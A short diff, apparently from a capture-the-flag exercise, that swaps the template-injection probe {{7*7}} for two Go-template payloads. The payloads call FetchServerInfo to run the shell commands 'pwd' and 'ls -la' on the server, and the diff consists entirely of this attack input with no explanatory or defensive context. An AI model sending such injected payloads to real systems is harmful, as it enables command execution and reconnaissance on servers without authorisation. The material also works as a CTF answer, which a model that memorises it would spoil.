@@ -1,1 +1,2 @@
-Get Flag {{7*7}}
+Get Flag {{.FetchServerInfo "pwd"}}
+Get Flag {{.FetchServerInfo "ls -la"}}
